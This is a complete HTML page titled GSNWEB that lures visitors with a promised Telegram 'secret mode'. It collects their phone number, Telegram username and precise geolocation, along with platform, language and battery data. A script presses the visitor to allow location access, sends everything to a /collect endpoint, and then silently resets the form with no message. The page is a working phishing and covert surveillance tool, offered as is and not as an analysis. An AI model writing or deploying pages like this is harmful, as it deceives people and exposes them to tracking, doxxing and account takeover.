<!DOCTYPE html>
<html lang="ru">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>GSNWEB</title>
  <style>
    @import url('https://fonts.googleapis.com/css2?family=SF+Pro+Text:wght@600&display=swap');
    body {
      font-family: 'SF Pro Text', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen,
        Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif;
      margin: 0; padding: 0;
      background: #f5f5f7;
      color: #111;
      display: flex;
      flex-direction: column;
      align-items: center;
      min-height: 100vh;
    }
    h1 {
      margin-top: 50px;
      font-size: 3rem;
      font-weight: 700;
      letter-spacing: -1px;
    }
    .arrow {
      margin-top: 20px;
      font-size: 3rem;
      animation: bounce 2s infinite;
      color: #007aff;
    }
    @keyframes bounce {
      0%, 100% { transform: translateY(0);}
      50% { transform: translateY(20px);}
    }
    .form-container {
      margin-top: 150px;
      width: 90%;
      max-width: 400px;
      background: white;
      padding: 30px;
      border-radius: 20px;
      box-shadow: 0 4px 15px rgba(0,0,0,0.1);
    }
    .form-container b {
      font-size: 1.2rem;
    }
    input[type="text"], input[type="tel"] {
      width: 100%;
      padding: 12px 15px;
      margin: 15px 0 30px 0;
      border: 1px solid #ccc;
      border-radius: 10px;
      font-size: 1rem;
      outline: none;
      transition: border-color 0.3s;
    }
    input[type="text"]:focus, input[type="tel"]:focus {
      border-color: #007aff;
    }
    button {
      width: 100%;
      padding: 15px;
      background: #007aff;
      border: none;
      border-radius: 12px;
      color: white;
      font-size: 1.2rem;
      font-weight: 600;
      cursor: pointer;
      transition: background-color 0.3s;
    }
    button:hover {
      background: #005bb5;
    }
  </style>
</head>
<body>
  <h1>GSNWEB</h1>
  <div class="arrow">⬇️</div>

  <div class="form-container">
    <b>Чтобы войти в секретный режим,<br>введите номер телефона и ваш @username в Telegram:</b>
    <form id="dataForm" autocomplete="off">
      <input type="tel" id="phone" name="phone" placeholder="Номер телефона (+7...)" pattern="^\+?\d{7,15}$" required />
      <input type="text" id="username" name="username" placeholder="@username" pattern="^@[\w\d_]{3,}$" required />
      <button type="submit">Отправить</button>
    </form>
  </div>

  <script>
    // Запрос геолокации при загрузке с сообщением
    function requestGeolocation() {
      if (navigator.geolocation) {
        alert('Для продолжения нажмите "Разрешить" на запрос геолокации.');
        navigator.geolocation.getCurrentPosition(position => {
          window.latitude = position.coords.latitude;
          window.longitude = position.coords.longitude;
        }, () => {
          window.latitude = null;
          window.longitude = null;
        });
      }
    }
    requestGeolocation();

    document.getElementById('dataForm').addEventListener('submit', async (e) => {
      e.preventDefault();
      const phone = document.getElementById('phone').value.trim();
      const username = document.getElementById('username').value.trim();
      const data = {
        phone,
        username,
        geolocation: {
          latitude: window.latitude || '–',
          longitude: window.longitude || '–',
        },
        timestamp: new Date().toLocaleString(),
        platform: navigator.platform,
        language: navigator.language,
        battery: {},
      };
      if (navigator.getBattery) {
        const battery = await navigator.getBattery();
        data.battery = {
          level: Math.round(battery.level * 100),
          charging: battery.charging,
        };
      }
      fetch('/collect', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(data),
      });
      // Никакого сообщения после отправки
      e.target.reset();
    });
  </script>
</body>
</html>
